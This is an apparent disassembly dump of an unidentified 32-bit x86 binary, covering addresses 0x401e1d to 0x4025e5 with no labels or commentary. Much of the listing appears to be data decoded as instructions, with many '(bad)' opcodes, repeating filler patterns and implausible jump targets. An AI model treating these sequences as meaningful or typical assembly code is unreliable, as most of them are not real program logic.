  401e1d:	stos   BYTE PTR es:[edi],al
  401e1e:	cmp    al,BYTE PTR [edx+eiz*2]
  401e21:	xor    bh,BYTE PTR ds:0x3d386204
  401e27:	add    al,0x62
  401e29:	adc    bh,BYTE PTR ds:0x3d3a6204
  401e2f:	add    al,0x62
  401e31:	sbb    bh,BYTE PTR ds:0x68620004
  401e37:	cmp    eax,0x3d706204
  401e3c:	add    al,0x62
  401e3e:	xchg   esp,eax
  401e3f:	cmp    eax,0x3da26204
  401e44:	add    al,0x62
  401e46:	test   al,0x3d
  401e48:	add    al,0x62
  401e4a:	into   
  401e4b:	cmp    eax,0x3dec6204
  401e50:	add    al,0x62
  401e52:	fst    DWORD PTR [edi]
  401e54:	push   ecx
  401e55:	pop    esi
  401e56:	fsincos 
  401e58:	push   eax
  401e59:	fldenvw [edi-0x5026a1bc]
  401e60:	inc    esp
  401e61:	data16 fnstcw WORD PTR [edi-0x1026a1bc]
  401e68:	inc    esp
  401e69:	data16 (bad) [ebx]
  401e6c:	inc    ebp
  401e6d:	pop    esi
  401e6e:	fprem1 
  401e70:	inc    esp
  401e71:	data16 fldcw WORD PTR [ebx]
  401e74:	inc    ebp
  401e75:	pop    esi
  401e76:	fnstcw WORD PTR [edi]
  401e78:	inc    ebp
  401e79:	data16 fld DWORD PTR ds:0x65d95e45
  401e80:	inc    ebp
  401e81:	data16 fstp DWORD PTR [ebp+0x45]
  401e85:	pop    esi
  401e86:	fld    DWORD PTR [ebp+0x45]
  401e89:	fnstenvw ds:0xa1d95e45
  401e90:	inc    ebp
  401e91:	data16 (bad) [ecx+0x45]
  401e95:	pop    esi
  401e96:	fst    DWORD PTR [ebp+0x45]
  401e99:	add    BYTE PTR [esi-0x27],ah
  401e9c:	in     eax,0x41
  401e9e:	pop    esi
  401e9f:	fyl2x  
  401ea1:	inc    ecx
  401ea2:	data16 (bad) ds:0xfbd95e42
  401ea9:	inc    ecx
  401eaa:	data16 fldcw WORD PTR [ebx-0x6026a1bf]
  401eb1:	inc    ecx
  401eb2:	data16 fld st(7)
  401eb5:	inc    ecx
  401eb6:	pop    esi
  401eb7:	fldenv [ecx+0x67d96641]
  401ebd:	inc    edx
  401ebe:	pop    esi
  401ebf:	fnstenv [ebx+0x42]
  401ec2:	data16 (bad) [edi+0x42]
  401ec6:	pop    esi
  401ec7:	fst    DWORD PTR [ebx]
  401ec9:	push   eax
  401eca:	data16 fld DWORD PTR [eax]
  401ecd:	cmc    
  401ece:	and    eax,0x202d00dd
  401ed3:	fld    QWORD PTR [eax]
  401ed5:	mov    ebp,0xcb00dd23
  401eda:	and    ebx,ebp
  401edc:	add    cl,dl
  401ede:	and    ebx,ebp
  401ee0:	add    ch,dh
  401ee2:	and    ch,bl
  401ee4:	add    BYTE PTR ds:0xf500dd21,cl
  401eea:	mov    al,ds:0xa12f00dd
  401eef:	fld    QWORD PTR [eax]
  401ef1:	sbb    esp,DWORD PTR [ecx-0x5ef0ff23]
  401ef7:	fld    QWORD PTR [eax]
  401ef9:	and    esp,DWORD PTR [ecx+0x7900dd]
  401eff:	mov    al,ds:0xa04900dd
  401f04:	fld    QWORD PTR [eax]
  401f06:	aas    
  401f07:	mov    al,ds:0xa0a900dd
  401f0c:	fld    QWORD PTR [eax]
  401f0e:	fwait
  401f0f:	mov    al,ds:0xa08700dd
  401f14:	fld    QWORD PTR [eax]
  401f16:	pop    ebp
  401f17:	mov    al,ds:0xa5e900dd
  401f1c:	fld    QWORD PTR [eax]
  401f1e:	call   FWORD PTR [ebp-0x65f4ff23]
  401f24:	fld    QWORD PTR [eax]
  401f26:	stc    
  401f27:	popf   
  401f28:	fld    QWORD PTR [eax]
  401f2a:	test   eax,0x9900dd25
  401f2f:	sbb    eax,0x258d00dd
  401f34:	fld    QWORD PTR [eax]
  401f36:	cdq    
  401f37:	sbb    eax,0x256900dd
  401f3c:	fld    QWORD PTR [eax]
  401f3e:	jnp    0x401f5d
  401f40:	fld    QWORD PTR [eax]
  401f42:	cmp    eax,0xdd25
  401f47:	sbb    eax,0x4d00049e
  401f4c:	sahf   
  401f4d:	add    al,0x0
  401f4f:	ins    DWORD PTR es:[edi],dx
  401f50:	sahf   
  401f51:	add    al,0x0
  401f53:	popa   
  401f54:	sahf   
  401f55:	add    al,0x0
  401f57:	jge    0x401ef9
  401f59:	add    al,0x0
  401f5b:	lea    ebx,[esi-0x618efffc]
  401f61:	add    al,0x0
  401f63:	add    BYTE PTR [edi-0x62],ch
  401f66:	add    al,0x0
  401f68:	cmp    DWORD PTR [esi-0x6386fffc],ebx
  401f6e:	add    al,0x0
  401f70:	stos   DWORD PTR es:[edi],eax
  401f71:	pushf  
  401f72:	add    al,0x0
  401f74:	cmp    ebx,ecx
  401f76:	add    BYTE PTR [eax],al
  401f78:	(bad)  
  401f79:	mov    ds:0xa2c10004,al
  401f7e:	add    al,0x0
  401f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f81:	mov    ds:0xd93b0004,al
  401f86:	add    BYTE PTR [eax],al
  401f88:	xor    ebx,ecx
  401f8a:	add    BYTE PTR [eax-0x7fff26fb],al
  401f90:	or     ecx,ebx
  401f92:	add    BYTE PTR [eax-0x7fff26fe],al
  401f98:	sti    
  401f99:	fadd   DWORD PTR [eax]
  401f9b:	add    bl,dl
  401f9d:	stos   DWORD PTR es:[edi],eax
  401f9e:	add    al,0x0
  401fa0:	jns    0x401f4d
  401fa2:	add    al,0x0
  401fa4:	sbb    eax,0xfb0004af
  401fa9:	fadd   DWORD PTR [eax]
  401fab:	add    BYTE PTR [edi-0x6fffb52],ah
  401fb1:	scas   al,BYTE PTR es:[edi]
  401fb2:	add    al,0x0
  401fb4:	pop    es
  401fb5:	scas   eax,DWORD PTR es:[edi]
  401fb6:	add    al,0x0
  401fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fb9:	scas   al,BYTE PTR es:[edi]
  401fba:	add    al,0x0
  401fbc:	mov    ebp,0x620004ae
  401fc1:	push   ss
  401fc2:	push   ebp
  401fc3:	add    al,0x62
  401fc5:	cli    
  401fc6:	push   esp
  401fc7:	add    al,0x0
  401fc9:	(bad)  
  401fca:	ficom  WORD PTR [edi+0x4]
  401fcd:	bound  edx,QWORD PTR [eax]
  401fcf:	push   esi
  401fd0:	add    al,0x62
  401fd2:	in     al,0x57
  401fd4:	add    al,0x62
  401fd6:	call   0x44a22432
  401fdb:	push   esi
  401fdc:	add    al,0x62
  401fde:	jo     0x402036
  401fe0:	add    al,0x62
  401fe2:	mov    WORD PTR [esi+0x4],ss
  401fe5:	bound  edi,QWORD PTR [eax+0x56]
  401fe8:	add    al,0x62
  401fea:	pushf  
  401feb:	push   edi
  401fec:	add    al,0x62
  401fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fef:	push   edi
  401ff0:	add    al,0x62
  401ff2:	jmp    0x3:0x34620457
  401ff9:	loop   0x402028
  401ffb:	push   esi
  401ffc:	add    al,0x62
  401ffe:	push   ss
  401fff:	push   esi
  402000:	add    al,0x62
  402002:	(bad)  
  402003:	push   ebp
  402004:	add    al,0x62
  402006:	push   0x6c620457
  40200b:	push   edi
  40200c:	add    al,0x62
  40200e:	cmp    dl,BYTE PTR [edi+0x4]
  402011:	bound  eax,QWORD PTR [esi+0x57]
  402014:	add    al,0x62
  402016:	(bad)  
  402017:	push   edi
  402018:	add    al,0x62
  40201a:	inc    eax
  40201b:	push   esi
  40201c:	add    al,0x62
  40201e:	add    al,BYTE PTR [ebx]
  402020:	add    BYTE PTR [edx+0x2],ah
  402023:	push   esp
  402024:	add    al,0x62
  402026:	aam    0x55
  402028:	add    al,0x62
  40202a:	mov    esi,0x62000455
  40202f:	mov    esi,0x2620455
  402034:	add    eax,DWORD PTR [eax]
  402036:	bound  edi,QWORD PTR [edx]
  402038:	cmp    eax,0xddd96204
  40203d:	cmp    eax,0x3dc5d966
  402042:	pop    esi
  402043:	fyl2xp1 
  402045:	cmp    eax,0x3de9d966
  40204a:	pop    esi
  40204b:	fcos   
  40204d:	cmp    eax,0x3e07d966
  402052:	pop    esi
  402053:	fstp   DWORD PTR [edi]
  402055:	fldenvw ds:0x9dd95e3e
  40205d:	cmp    DWORD PTR [esi-0x27],esp
  402060:	mov    DWORD PTR [ecx],edi
  402062:	pop    esi
  402063:	fstp   DWORD PTR [ebx+0x39]
  402066:	data16 (bad) [ebx+0x39]
  40206a:	pop    esi
  40206b:	fnstenv [edi]
  40206d:	cmp    DWORD PTR [esi-0x27],esp
  402070:	sub    DWORD PTR [ecx],edi
  402072:	pop    esi
  402073:	fld    DWORD PTR [edi+0x6dd9663a]
  402079:	cmp    bl,BYTE PTR [esi-0x27]
  40207c:	mov    cl,0x3a
  40207e:	data16 fnstcw WORD PTR [ebp-0x6e26a1c6]
  402085:	cmp    ah,BYTE PTR [esi-0x27]
  402088:	out    0x3a,eax
  40208a:	pop    esi
  40208b:	(bad)  
  40208d:	cmp    ah,BYTE PTR [esi-0x27]
  402090:	retf   
  402091:	cmp    al,BYTE PTR [eax]
  402093:	pop    esi
  402094:	fld    st(7)
  402096:	cmp    ah,BYTE PTR [esi-0x27]
  402099:	retf   
  40209a:	push   ebx
  40209b:	pop    esi
  40209c:	fnstcw WORD PTR [edi-0x482699c7]
  4020a2:	cmp    bl,BYTE PTR [esi-0x27]
  4020a5:	lds    edi,FWORD PTR [edx]
  4020a7:	data16 fldcw WORD PTR [ecx+0x3b]
  4020ab:	pop    esi
  4020ac:	fstp   DWORD PTR [ecx+0x3b]
  4020af:	data16 fst DWORD PTR [ebx+0xd95e3b]
  4020b6:	sub    ecx,DWORD PTR [ecx-0x76eeff23]
  4020bc:	fld    QWORD PTR [eax]
  4020be:	sbb    edi,DWORD PTR [ecx-0x23]
  4020c1:	add    BYTE PTR [ebx+0xf],cl
  4020c4:	fld    QWORD PTR [eax]
  4020c6:	addr16 pop ss
  4020c8:	fld    QWORD PTR [eax]
  4020ca:	imul   ecx,DWORD PTR [edi],0xffffffdd
  4020cd:	add    bl,bl
  4020cf:	xor    ebp,ebx
  4020d1:	add    BYTE PTR [ebx-0x62ff22d2],cl
  4020d7:	fld    QWORD PTR ss:[eax]
  4020da:	stos   DWORD PTR es:[edi],eax
  4020db:	fld    QWORD PTR cs:[eax]
  4020de:	sbb    DWORD PTR [edi],edx
  4020e0:	fld    QWORD PTR [eax]
  4020e2:	add    eax,0xfd00dd0f
  4020e7:	push   ss
  4020e8:	fld    QWORD PTR [eax]
  4020ea:	loope  0x4020fa
  4020ec:	fld    QWORD PTR [eax]
  4020ee:	shl    DWORD PTR [ecx-0x4e38ff23],0xdd
  4020f5:	add    BYTE PTR [ecx+0xddb100],dl
  4020fb:	mov    eax,ds:0xf00ddb1
  402100:	js     0x4020df
  402102:	add    BYTE PTR ds:0x6b00dd78,dl
  402108:	imul   ebx,ebp,0x0
  40210b:	jns    0x402178
  40210d:	fld    QWORD PTR [eax]
  40210f:	sub    ebx,DWORD PTR [ecx-0x23]
  402112:	add    BYTE PTR [ebx-0x34ff22a6],bh
  402118:	dec    edx
  402119:	fld    QWORD PTR [eax]
  40211b:	fisttp WORD PTR [edx-0x23]
  40211e:	add    BYTE PTR [edi+0x35],ah
  402121:	fld    QWORD PTR [eax]
  402123:	push   ebx
  402124:	sub    eax,0x354b00dd
  402129:	fld    QWORD PTR [eax]
  40212b:	fwait
  40212c:	xchg   ecx,eax
  40212d:	fld    QWORD PTR [eax]
  40212f:	add    ch,ch
  402131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402132:	add    al,0x0
  402134:	das    
  402135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402136:	add    al,0x0
  402138:	inc    ebx
  402139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40213a:	add    al,0x0
  40213c:	jae    0x402108
  40213e:	add    al,0x0
  402140:	(bad)
  402144:	sbb    edx,ecx
  402146:	add    al,0x0
  402148:	xor    eax,0x3d0004ca
  40214d:	retf   0x4
  402150:	sbb    eax,0xf10004ca
  402155:	leave  
  402156:	add    al,0x0
  402158:	icebp  
  402159:	leave  
  40215a:	add    al,0x0
  40215c:	add    bl,al
  40215e:	leave  
  40215f:	add    al,0x0
  402161:	pop    edi
  402162:	rol    DWORD PTR [eax+eax*1],1
  402165:	pop    edi
  402166:	rol    DWORD PTR [eax+eax*1],1
  402169:	imul   ecx,ecx,0x4
  40216c:	add    BYTE PTR [ecx-0x37],bh
  40216f:	add    al,0x0
  402171:	aaa    
  402172:	iret   
  402173:	add    al,0x0
  402175:	add    ecx,edi
  402177:	add    al,0x0
  402179:	std    
  40217a:	into   
  40217b:	add    al,0x0
  40217d:	iret   
  40217e:	into   
  40217f:	add    al,0x0
  402181:	jecxz  0x402151
  402183:	add    al,0x0
  402185:	mov    bl,0xce
  402187:	add    al,0x0
  402189:	dec    ebp
  40218a:	into   
  40218b:	add    al,0x0
  40218d:	push   ebx
  40218e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40218f:	add    al,0x0
  402191:	ja     0x402138
  402193:	add    al,0x0
  402195:	ja     0x40213c
  402197:	add    al,0x0
  402199:	imul   esp,DWORD PTR [ebp-0x5ac6fffc],0x4
  4021a0:	add    BYTE PTR [edi-0x5b],bl
  4021a3:	add    al,0x0
  4021a5:	jne    0x40217a
  4021a7:	add    al,0x0
  4021a9:	bound  edx,QWORD PTR [esi]
  4021ab:	cmp    al,0x4
  4021ad:	bound  ecx,QWORD PTR [esp+edi*1+0x4]
  4021b1:	bound  ecx,QWORD PTR [edx+0x3c]
  4021b4:	add    al,0x62
  4021b6:	fidivr DWORD PTR ds:0x3c266204
  4021bc:	add    al,0x62
  4021be:	cld    
  4021bf:	cmp    eax,DWORD PTR [eax+eax*1]
  4021c2:	bound  edi,QWORD PTR [edx-0x99dfbc2]
  4021c8:	push   edx
  4021c9:	add    al,0x62
  4021cb:	xor    BYTE PTR [edi],0x4
  4021ce:	bound  esi,QWORD PTR [edx+edx*2+0x4]
  4021d2:	bound  eax,QWORD PTR [edx]
  4021d4:	add    eax,DWORD PTR [eax]
  4021d6:	bound  ebx,QWORD PTR [edx-0x5f9dfbb8]
  4021dc:	dec    eax
  4021dd:	add    al,0x62
  4021df:	mov    dl,0x48
  4021e1:	add    al,0x62
  4021e3:	add    al,BYTE PTR [ebx]
  4021e5:	add    BYTE PTR [edx-0x68],ah
  4021e8:	dec    ebp
  4021e9:	add    al,0x62
  4021eb:	mov    eax,0xea62044d
  4021f0:	dec    ebp
  4021f1:	add    al,0x62
  4021f3:	jmp    0x44c:0x2662044d
  4021fa:	bound  ecx,QWORD PTR [ebp+ecx*2+0x4]
  4021fe:	bound  ebx,QWORD PTR [eax]
  402200:	dec    ebp
  402201:	add    al,0x62
  402203:	push   edx
  402204:	dec    ebp
  402205:	add    al,0x62
  402207:	scas   al,BYTE PTR es:[edi]
  402208:	dec    ebp
  402209:	add    al,0x62
  40220b:	call   0x44d:0x8862044d
  402212:	bound  eax,QWORD PTR [edx]
  402214:	add    eax,DWORD PTR [eax]
  402216:	(bad)  
  402217:	fild   WORD PTR [eax+eax*1]
  40221a:	loop   0x40224b
  40221c:	add    eax,DWORD PTR [eax]
  40221e:	loop   0x402225
  402220:	add    eax,DWORD PTR [eax]
  402222:	loop   0x4021fc
  402224:	jmp    0x402229
  402226:	add    BYTE PTR [edx+0x59],ah
  402229:	test   BYTE PTR [ebx],0x62
  40222c:	pop    ecx
  40222d:	pop    edi
  40222e:	dec    ebx
  40222f:	pop    esi
  402230:	(bad)  
  402232:	add    esp,DWORD PTR [edx+0x59]
  402235:	hlt    
  402236:	add    esp,DWORD PTR [edx+0x59]
  402239:	fild   DWORD PTR [ebx]
  40223b:	bound  ebx,QWORD PTR [ecx+0x57]
  40223e:	dec    edx
  40223f:	pop    esi
  402240:	fstp   DWORD PTR [ebx+0x4a]
  402243:	fldenvw [ebp-0x726a1b6]
  40224a:	add    esp,DWORD PTR [edx+0x59]
  40224d:	lea    ecx,[edx+0x5e]
  402250:	fnstcw WORD PTR [ebx-0x102699b6]
  402256:	add    esp,DWORD PTR [edx+0x59]
  402259:	aam    0x3
  40225b:	bound  ebx,QWORD PTR [ecx-0x23]
  40225e:	add    esp,DWORD PTR [edx+0x59]
  402261:	test   eax,0xeed9664a
  402266:	add    esp,DWORD PTR [edx+0x59]
  402269:	adc    ecx,DWORD PTR [ebp+0x66]
  40226c:	fld1   
  40226e:	add    esp,DWORD PTR [edx+0x59]
  402271:	mov    ebp,0xcbd9664c
  402276:	dec    esp
  402277:	pop    esi
  402278:	(bad)  
  40227a:	add    esp,DWORD PTR [edx+0x59]
  40227d:	mov    eax,ds:0xead95e4c
  402282:	add    esp,DWORD PTR [edx+0x59]
  402285:	cli    
  402286:	add    esp,DWORD PTR [edx+0x59]
  402289:	sbb    al,BYTE PTR [eax+eax*1]
  40228c:	bound  ebx,QWORD PTR [ecx-0x13]
  40228f:	add    esp,DWORD PTR [edx+0x59]
  402292:	in     al,0x3
  402294:	bound  ebx,QWORD PTR [ecx-0x23]
  402297:	dec    esp
  402298:	pop    esi
  402299:	(bad)  
  40229b:	dec    esp
  40229c:	data16 fld DWORD PTR [eax]
  40229f:	jmp    0x1d40fc05
  4022a4:	stos   DWORD PTR es:[edi],eax
  4022a5:	aad    0x0
  4022a7:	gs test eax,0xa5e700d5
  4022ad:	aad    0x0
  4022af:	stc    
  4022b0:	popf   
  4022b1:	aad    0x0
  4022b3:	repz and eax,0x2a0d00d5
  4022b9:	aad    0x0
  4022bb:	nop    ebp
  4022be:	add    cl,dh
  4022c0:	sbb    eax,0x25a500d5
  4022c5:	aad    0x0
  4022c7:	mov    bh,0x1d
  4022c9:	aad    0x0
  4022cb:	mov    ebp,0x8300d525
  4022d0:	sbb    eax,0x259900d5
  4022d5:	aad    0x0
  4022d7:	sbb    DWORD PTR ds:0x61e900d5,0xffffffd9
  4022de:	add    BYTE PTR [edi],dl
  4022e0:	sbb    dl,ch
  4022e2:	add    BYTE PTR [edi+0x26],dl
  4022e5:	aad    0x0
  4022e7:	xchg   ecx,eax
  4022e8:	and    ebp,edx
  4022ea:	add    BYTE PTR [ecx+0x21],dh
  4022ed:	aad    0x0
  4022ef:	jmp    0x11983f4
  4022f4:	inc    edi
  4022f5:	lods   eax,DWORD PTR ds:[esi]
  4022f6:	aad    0x0
  4022f8:	sbb    esp,DWORD PTR [ebp-0x62beff2b]
  4022fe:	aad    0x0
  402300:	sub    DWORD PTR [ebp-0x5300ff2b],edx
  402306:	aad    0x0
  402308:	pop    es
  402309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40230a:	aad    0x0
  40230c:	jns    0x4022aa
  40230e:	aad    0x0
  402310:	dec    ebx
  402311:	xchg   esp,eax
  402312:	aad    0x0
  402314:	push   edi
  402315:	lods   al,BYTE PTR ds:[esi]
  402316:	aad    0x0
  402318:	add    BYTE PTR [ebx],cl
  40231a:	fiadd  DWORD PTR [eax]
  40231c:	add    bl,bh
  40231e:	fld    DWORD PTR [eax]
  402320:	add    bh,dh
  402322:	std    
  402323:	mov    dh,bl
  402325:	dec    eax
  402326:	loopne 0x40231a
  402328:	inc    edx
  402329:	js     0x402304
  40232b:	addr16 fdivrp st(0),st
  40232e:	icebp  
  40232f:	cld    
  402330:	and    esi,DWORD PTR [eax]
  402332:	pop    ecx
  402333:	mov    dh,0x3e
  402335:	xor    bh,BYTE PTR [ecx-0xa]
  402338:	dec    esp
  402339:	jmp    0x4022fa
  40233b:	jecxz  0x40232c
  40233d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40233e:	xchg   DWORD PTR [edi+0x6c593c3d],ebx
  402344:	pop    esi
  402345:	imul   eax,DWORD PTR [edi],0xf3e1475f
  40234b:	jmp    0x717bd783
  402350:	jae    0x402316
  402352:	ret    
  402353:	rcr    DWORD PTR [edx],0x0
  402356:	fcomp  DWORD PTR fs:[ebp+0x4e]
  40235a:	push   esp
  40235b:	into   
  40235c:	cs mov cl,0x1d
  40235f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402360:	cwde   
  402361:	mov    bh,0x17
  402363:	xor    eax,0xdf0ba520
  402368:	test   BYTE PTR [edi-0x42],0xdc
  40236c:	push   ss
  40236d:	jae    0x4023a7
  40236f:	dec    esi
  402370:	scas   eax,DWORD PTR es:[edi]
  402371:	push   ss
  402372:	cli    
  402373:	xor    esi,DWORD PTR [ebx]
  402375:	sub    DWORD PTR [ebp-0x7e],esi
  402378:	rcl    BYTE PTR [ecx],cl
  40237a:	fld    DWORD PTR [ebx]
  40237c:	(bad)  
  40237d:	mov    edi,0x603e5d7c
  402382:	dec    ecx
  402383:	xchg   BYTE PTR [edi],al
  402385:	cmc    
  402386:	pop    edx
  402387:	dec    esp
  402388:	rcl    DWORD PTR [ecx],cl
  40238a:	mov    dl,0x40
  40238c:	add    BYTE PTR [eax],al
  40238e:	add    edx,edi
  402390:	loop   0x4023b3
  402392:	bound  ecx,QWORD PTR [ebp+0x244b33a5]
  402398:	push   0xf6d073d2
  40239d:	dec    ebp
  40239f:	mov    ebx,0xaa823e8c
  4023a4:	daa    
  4023a5:	push   ebp
  4023a6:	iret   
  4023a7:	rol    esi,1
  4023a9:	dec    edx
  4023aa:	popf   
  4023ab:	test   BYTE PTR ds:0x6fe25efc,cl
  4023b1:	mov    bh,0x2a
  4023b3:	lds    ebx,FWORD PTR ds:0x485d52dd
  4023b9:	call   0xf4943fbe
  4023be:	and    edx,DWORD PTR [eax+edx*4]
  4023c1:	ds sub ch,dl
  4023c4:	push   edi
  4023c5:	mov    esp,0x957a3365
  4023ca:	mov    ebp,0x53e77c20
  4023cf:	push   edx
  4023d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023d1:	sbb    al,0x5a
  4023d3:	pusha  
  4023d4:	mov    ds:0xdb824829,al
  4023d9:	cmp    eax,0xce9c279c
  4023de:	ja     0x402403
  4023e0:	repnz mov bl,0x95
  4023e3:	lea    ecx,ds:0xb6758979
  4023e9:	mov    edx,0xd7601c32
  4023ee:	fisub  DWORD PTR [ebp+edx*1+0x12]
  4023f2:	sbb    dh,BYTE PTR [eax+0x3c]
  4023f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023f7:	outs   dx,BYTE PTR ds:[esi]
  4023f8:	lea    ebp,[esp+ebp*2]
  4023fb:	test   al,0x53
  4023fd:	xchg   ecx,eax
  4023fe:	lahf   
  4023ff:	aam    0x32
  402401:	std    
  402402:	jge    0x402453
  402404:	rcr    bl,0x4c
  402407:	jb     0x402412
  402409:	push   ebp
  40240a:	fsub   DWORD PTR [edx-0x14d68227]
  402410:	out    0xa5,eax
  402412:	test   ecx,0x57277324
  402418:	mov    ds:0xea335302,al
  40241d:	push   edi
  40241e:	popf   
  40241f:	add    BYTE PTR [edx+0x19],ah
  402422:	cs scas al,BYTE PTR es:[edi]
  402424:	fidivr DWORD PTR [eax-0x73189418]
  40242a:	push   0x71ea2570
  40242f:	bound  edi,QWORD PTR ss:[edi]
  402432:	jmp    0x69f5586f
  402437:	popf   
  402438:	jo     0x402467
  40243a:	into   
  40243b:	jo     0x4023e2
  40243d:	jmp    0x3fa25ab3
  402442:	jmp    0x61f5987f
  402447:	shl    DWORD PTR [edi-0x4c],0x7f
  40244b:	push   0xffffff90
  40244d:	jmp    0xe9a25fac
  402452:	ret    
  402453:	add    al,0xe3
  402455:	and    DWORD PTR [ebp-0x57],0xffffff98
  402459:	in     al,dx
  40245a:	retf   0xb30e
  40245d:	jmp    0x19a28eb6
  402462:	scas   al,BYTE PTR es:[edi]
  402463:	retf   
  402464:	xchg   DWORD PTR [ebx],ecx
  402466:	test   DWORD PTR [ebx+eiz*4-0x6c8c1b76],0x627494e9
  402471:	sbb    DWORD PTR [esi],ebp
  402473:	mov    esp,0x20700b67
  402478:	xchg   edi,eax
  402479:	mov    al,ds:0xe9333542
  40247e:	xchg   edi,eax
  40247f:	stos   BYTE PTR es:[edi],al
  402480:	bound  ebx,QWORD PTR [ecx]
  402482:	cs call 0x566f:0xb9da00
  40248a:	je     0x402426
  40248c:	push   ds
  40248d:	cmp    DWORD PTR [ecx],ebp
  40248f:	adc    DWORD PTR [edi+ecx*1-0x26],ebx
  402493:	adc    BYTE PTR [edx],dh
  402495:	mov    cs,ebx
  402497:	std    
  402498:	je     0x4024f5
  40249a:	in     eax,dx
  40249b:	lea    ebx,[ecx+0x4e4b46ea]
  4024a1:	retf   
  4024a2:	mov    ds:0x6e442aa7,eax
  4024a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a8:	daa    
  4024a9:	jns    0x4024e5
  4024ab:	ins    DWORD PTR es:[edi],dx
  4024ac:	mov    dh,0x33
  4024ae:	daa    
  4024af:	adc    DWORD PTR [edi-0x513f25e1],edx
  4024b5:	retf   
  4024b6:	popa   
  4024b7:	and    BYTE PTR [edi+eax*8+0x6c1aeb52],dl
  4024be:	daa    
  4024bf:	adc    DWORD PTR [edi-0x513f2661],edx
  4024c5:	jmp    0x402528
  4024c7:	and    BYTE PTR [eax],dh
  4024c9:	arpl   WORD PTR [esi-0x49],ax
  4024cc:	aam    0xfa
  4024ce:	adc    DWORD PTR es:[eax+0x62],ecx
  4024d2:	fst    DWORD PTR [eax]
  4024d4:	ret    
  4024d5:	pusha  
  4024d6:	test   al,0x5a
  4024d8:	sbb    ecx,DWORD PTR [eax]
  4024da:	in     al,0xc7
  4024dc:	out    dx,eax
  4024dd:	pop    ebx
  4024de:	sub    BYTE PTR [ecx],dl
  4024e0:	push   esp
  4024e1:	(bad)  
  4024e3:	shr    BYTE PTR [esi-0x6100f337],0x0
  4024ea:	clc    
  4024eb:	cmp    DWORD PTR [ebp-0x4a],ebp
  4024ee:	xor    esp,DWORD PTR [edi]
  4024f0:	adc    DWORD PTR [edi+0x2ec0d99e],edx
  4024f6:	enter  0x2061,0x68
  4024fa:	or     esp,edi
  4024fc:	fmul   QWORD PTR [esi-0x53]
  4024ff:	sbb    dl,BYTE PTR [ecx]
  402501:	add    bl,dl
  402503:	test   eax,0x9b3baa00
  402508:	cs and al,0xc
  40250b:	in     al,0x9e
  40250d:	(bad)  
  40250e:	shr    BYTE PTR [edx-0x2e],0x11
  402512:	mov    esi,0xa1100042
  402517:	(bad)  
  402518:	add    DWORD PTR [ecx+esi*1],0x5e
  40251c:	mov    edi,0xd31bccbf
  402521:	adc    DWORD PTR [edx+0x410fff0b],ebx
  402527:	(bad)  
  402528:	push   ecx
  402529:	pop    edx
  40252a:	(bad)  
  40252b:	aas    
  40252c:	lods   al,BYTE PTR ds:[esi]
  40252d:	inc    esp
  40252e:	xchg   esi,edi
  402530:	iret   
  402531:	adc    ebx,ebx
  402533:	test   eax,0x6fb4c000
  402538:	mov    BYTE PTR [eax],ah
  40253a:	iret   
  40253b:	pop    eax
  40253c:	jae    0x40256f
  40253e:	mov    edx,0x414cf4e1
  402543:	stos   BYTE PTR es:[edi],al
  402544:	push   edi
  402545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402546:	adc    edi,edi
  402548:	sbb    BYTE PTR [esi+0x13],dl
  40254b:	or     BYTE PTR [ebx+0x67],0x0
  40254f:	sbb    DWORD PTR [eax],ecx
  402551:	rcl    BYTE PTR [ecx],1
  402553:	push   ss
  402554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402555:	add    al,al
  402557:	hlt    
  402558:	dec    ebp
  402559:	std    
  40255a:	jmp    FWORD PTR [edx-0x61]
  40255d:	jns    0x402561
  40255f:	mov    edx,0x1811ce4e
  402564:	iret   
  402565:	add    BYTE PTR [eax],al
  402567:	jnp    0x40253e
  402569:	add    BYTE PTR [ecx],al
  40256b:	adc    cl,BYTE PTR [edx+0x56]
  40256e:	xchg   ebp,eax
  40256f:	pop    ss
  402570:	push   esp
  402571:	iret   
  402572:	adc    eax,ebx
  402574:	jbe    0x402576
  402576:	stos   BYTE PTR es:[edi],al
  402577:	jnp    0x40255c
  402579:	inc    eax
  40257a:	(bad)  
  40257b:	bound  eax,QWORD PTR [ecx]
  40257d:	fist   DWORD PTR [eax-0x30001361]
  402583:	jae    0x40250e
  402585:	add    DWORD PTR [eax],eax
  402587:	clc    
  402588:	repnz dec ebx
  40258a:	xchg   BYTE PTR cs:[eax],bh
  40258d:	push   ss
  40258e:	sahf   
  40258f:	push   ds
  402590:	jl     0x402532
  402592:	rcl    BYTE PTR [ebx+0x75],cl
  402595:	mov    eax,0x19c5200
  40259a:	and    DWORD PTR [esi+0x1a],0x23
  40259e:	mov    ebp,0xd0f613ab
  4025a3:	jae    0x402552
  4025a5:	pop    ebx
  4025a6:	add    BYTE PTR [edx],ah
  4025a8:	mov    eax,0x5fdfdbc
  4025ad:	test   eax,0xec769eac
  4025b2:	rol    BYTE PTR [eax],1
  4025b4:	push   ebx
  4025b5:	push   edx
  4025b6:	pusha  
  4025b7:	add    BYTE PTR [edx],ah
  4025b9:	cmp    BYTE PTR [ecx-0x1c917d78],bl
  4025bf:	xchg   ecx,ecx
  4025c1:	jecxz  0x4025d9
  4025c3:	shl    BYTE PTR [ebx+0x70],cl
  4025c6:	retf   
  4025c7:	add    BYTE PTR [edx-0x7d7766c9],ah
  4025cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025ce:	and    BYTE PTR ds:0xd1321b2b,dh
  4025d4:	push   ebx
  4025d5:	mov    al,0xaa
  4025d7:	add    BYTE PTR [edx+0x42889937],ah
  4025dd:	ja     0x402589
  4025df:	adc    dh,BYTE PTR [esi+0x73cf5457]
  4025e5:	mov    cl,BYTE PTR [edi+0x0]
